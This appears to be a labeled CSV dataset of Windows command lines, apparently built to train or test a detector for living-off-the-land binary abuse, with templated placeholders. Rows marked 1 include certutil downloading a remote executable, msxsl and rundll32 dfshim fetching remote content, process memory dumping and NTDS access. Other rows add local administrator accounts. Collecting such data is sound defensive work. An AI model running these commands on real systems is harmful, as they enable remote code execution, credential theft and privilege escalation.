command,label,source,command_id
msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext},1,combined_lotl,1387
Visio.exe {REMOTEURL},1,combined_lotl,1388
"C:\Windows\System32\type.exe ""C:\Users\fwyfc\Documents\Desktop\axtghzkgo.txt""",0,combined_lotl,1389
net.exe user guest /add,0,combined_lotl,1390
net.exe user xofhbcnm /add,0,combined_lotl,1391
"fsutil file layout ""C:\Users\kjmmyfgit.exe""",0,combined_lotl,1392
fsianycpu.exe {PATH:.fsscript},1,combined_lotl,1393
regsvr32.exe /u /s {PATH:.dll},1,combined_lotl,1394
Rem eB4aNFwRc7N8iw7SqAUV,0,combined_lotl,1395
msedge.exe {REMOTEURL:.exe.txt},1,combined_lotl,1396
"certutil -hashfile ""C:\Temp\Temp\tspuzgmuie.exe"" SHA256",0,combined_lotl,1397
net.exe user fhvqnsuq /add,0,combined_lotl,1398
control.exe {PATH_ABSOLUTE:.cpl},1,combined_lotl,1399
net.exe user ighnbktf /add,0,combined_lotl,1400
echo.exe tyyKFgvu2Cls > D:\Users\Logs\apckui.ini,0,combined_lotl,1401
echo.exe dIo6R1MuhGGd > D:\Users\Windows\viyosks.dat,0,combined_lotl,1402
"copy.exe ""C:\Program Files\eczvnfbznz.txt"" ""D:\Temp\Program Files\yjdmp.log""",0,combined_lotl,1403
net.exe user qnzftmln /add,0,combined_lotl,1404
net.exe use Z: \\192.168.164.172\backup,0,combined_lotl,1405
ac i ntds i,1,combined_lotl,1406
"attrib.exe +h ""C:\Users\efelwt.txt""",0,combined_lotl,1407
fondue.exe /enable-feature:NETFX4 /caller-name:Admin.bat /hide-ux:all,0,combined_lotl,1408
"findstr /C:""xAKswkgQapQC"" ""D:\Windows\aqsthgk.dat""",0,combined_lotl,1409
net.exe use Z: \\192.168.214.104\data,0,combined_lotl,1410
"rundll32.exe {PATH_SMB:.dll},EntryPoint",1,combined_lotl,1411
net use Z: \\192.168.85.90\data,0,combined_lotl,1412
createdump.exe -n -f {PATH:.dmp} {PID},1,combined_lotl,1413
net.exe user ecvhffam /add,0,combined_lotl,1414
DeviceCredentialDeployment,1,combined_lotl,1415
"icacls ""C:\Logs\Windows\pqxbvrda.exe"" /grant Everyone:F",0,combined_lotl,1416
C:\Windows\System32\ping.exe 192.168.32.119,0,combined_lotl,1417
"fsutil.exe devdrv setFiltersAllowed [[/f] /volume C:\Users\ypmsbjj\Pictures] """"filter1, filter 2, ...""""",0,combined_lotl,1418
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Temp\Temp\beung.dll\"" \""C:\Users\Program Files\qylxa.log\"""" /sc daily /st 23:00",0,combined_lotl,1419
"icacls ""C:\Users\ajmcc\Downloads\Documents\ixjylddyor.exe"" /grant Everyone:F",0,combined_lotl,1420
"C:\Windows\fsutil.exe file layout ""C:\AppData\kfcnrkrot.dat""",0,combined_lotl,1421
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name,1,combined_lotl,1422
"C:\Windows\System32\move.exe ""C:\Program Files\Logs\cuchhxs.sys"" ""D:\Windows\Temp\bkbelhv.sys""",0,combined_lotl,1423
"type.exe ""D:\Users\vjbhbf\Documents\tfqxojxg.dat""",0,combined_lotl,1424
cmd.exe /c dir C:\Temp,0,combined_lotl,1425
fsutil devdrv query [<volume path>],0,combined_lotl,1426
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Temp\Temp\urqrvrr.log\"" \""C:\Users\exweblbx.sys\"""" /sc daily /st 23:00",0,combined_lotl,1427
WorkFolders,1,combined_lotl,1428
"certutil -hashfile ""D:\Temp\bzjha.log"" SHA256",0,combined_lotl,1429
"C:\{redacted}\
logins.ps1",1,combined_lotl,1430
"C:\Windows\certutil.exe -hashfile ""C:\AppData\zaatv.ini"" SHA256",0,combined_lotl,1431
"move.exe ""D:\Logs\bjyimq.log"" ""D:\Windows\Program Files\qkoslguqwi.ini""",0,combined_lotl,1432
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}",1,combined_lotl,1433
"echo.exe %DATE% %TIME% >> ""C:\Users\tbfdkv\Downloads\Documents\hjgiz.txt""",0,combined_lotl,1434
net.exe localgroup Administrators thdoeoao /add,0,combined_lotl,1435
net.exe use Z: \\192.168.193.121\data,0,combined_lotl,1436
"type.exe ""D:\Program Files\nawmwp.dat""",0,combined_lotl,1437
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe},1,combined_lotl,1438
"move.exe ""C:\Windows\khgoqksn.sys"" ""D:\Users\AppData\kbnlnmpqnq.sys""",0,combined_lotl,1439
net.exe use Z: \\192.168.231.139\public,0,combined_lotl,1440
dotnet.exe fsi,1,combined_lotl,1441
ProtocolHandler.exe {REMOTEURL},1,combined_lotl,1442
ping.exe 192.168.35.29,0,combined_lotl,1443
net.exe user tsmfetjo /add,0,combined_lotl,1444
psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0,1,combined_lotl,1445
net.exe localgroup Administrators gccsibvu /add,0,combined_lotl,1446
net.exe localgroup Administrators xhkouxvd /add,0,combined_lotl,1447
pcalua.exe -a {PATH_SMB:.dll},1,combined_lotl,1448
rcsi.exe {PATH:.csx},1,combined_lotl,1449
msbuild.exe {PATH:.xml},1,combined_lotl,1450
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},1,combined_lotl,1451
net use Z: \\192.168.74.29\data,0,combined_lotl,1452
"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",1,combined_lotl,1453
